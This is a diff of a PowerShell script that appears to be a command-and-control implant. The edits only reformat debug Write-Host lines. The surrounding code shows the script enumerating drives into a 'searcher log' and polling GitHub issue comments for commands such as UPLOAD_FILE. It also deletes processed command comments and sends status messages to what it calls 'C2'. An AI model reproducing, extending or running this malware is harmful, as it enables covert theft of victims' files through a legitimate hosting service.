@@ -57,7 +57,7 @@ function Update-SearcherLog
                 }
             }
             Write-Console -Body ("Searcher completed searching the " + $drive + " drive.") -IssueNumber $issueNumber
-            Write-Host "DEBUG: Searcher completed searching the " + $drive + " drive."
+            Write-Host ("DEBUG: Searcher completed searching the " + $drive + " drive.")
         }
         $fileArray = $fileList.ToArray()
         Add-Content -Path $searcherLogPath -Value $fileArray
@@ -142,7 +142,7 @@ try
             {
                 $mostRecentSearcherLogID = $comment.ID
                 Write-Console -Body ("Identified comment ID " + $mostRecentSearcherLogID + " as the most recent searcher log upload.") -IssueNumber $issueNumber
-                Write-Host "DEBUG: Identified comment ID " + $mostRecentSearcherLogID + " as the most recent searcher log upload."
+                Write-Host ("DEBUG: Identified comment ID " + $mostRecentSearcherLogID + " as the most recent searcher log upload.")
                 break
             }
         }
@@ -170,7 +170,7 @@ try
     Else 
     {
         Write-Console -Body ("Searcher log comment with ID " + $mostRecentSearcherLogID + " found.") -IssueNumber $issueNumber
-        Write-Host "DEBUG: Searcher log comment with ID " + $mostRecentSearcherLogID + " found."
+        Write-Host ("DEBUG: Searcher log comment with ID " + $mostRecentSearcherLogID + " found.")
     }
 }
 catch 
@@ -216,7 +216,7 @@ try
                     Remove-GitHubComment -OwnerName BeinnUas1 -RepositoryName ceannard1 -CommentID $comment.ID
                     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command.")
                     Write-Console -Body ("Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified C2. Exiting.") -IssueNumber $issueNumber
-                    Write-Host "DEBUG: Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified C2. Exiting."; Start-Sleep -s 600
+                    Write-Host ("DEBUG: Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified C2. Exiting."); Start-Sleep -s 600
                     Exit
                 }
             }
